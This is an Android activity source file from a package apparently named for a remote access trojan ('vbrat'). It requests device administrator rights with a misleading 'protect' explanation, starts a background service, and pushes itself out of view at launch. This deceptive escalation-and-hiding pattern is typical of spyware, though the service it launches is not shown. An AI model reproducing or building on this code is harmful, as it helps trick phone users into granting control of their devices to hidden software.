package com.example.vbrat;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.Service;
import android.app.admin.DeviceAdminReceiver;
import android.app.admin.DevicePolicyManager;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import androidx.appcompat.app.AppCompatActivity;

import android.os.AsyncTask;
import android.os.Bundle;
import android.os.Environment;
import android.os.IBinder;
import android.os.SystemClock;
import android.util.Log;
import android.widget.Toast;

import java.io.File;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.Serializable;
import java.nio.file.FileSystem;
import java.util.ArrayList;
import java.util.Scanner;
import java.util.concurrent.TimeUnit;

public class MainActivity extends AppCompatActivity {

    @Override
    public void onResume(){
        super.onResume();
        Log.e("VBRESUME", "onResume: RESUMED" );

    }
    @Override
    protected void onCreate(Bundle savedInstanceState) {

        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        try {
            // Initiate DevicePolicyManager.
            DevicePolicyManager policyMgr = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);

            // Set DeviceAdminDemo Receiver for active the component with different option
            ComponentName componentName = new ComponentName(this, DeviceAdminComponent.class);

            if (!policyMgr.isAdminActive(componentName)) {
                // try to become active
                Intent intent = new Intent(	DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
                intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN,	componentName);
                intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                        "Click on Activate button to protect yo!");
                startActivity(intent);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }

        //startService(new Intent(this, BackgroundService.class));

        startService(new Intent(MainActivity.this,service.class));
        moveTaskToBack(true);

    }

}




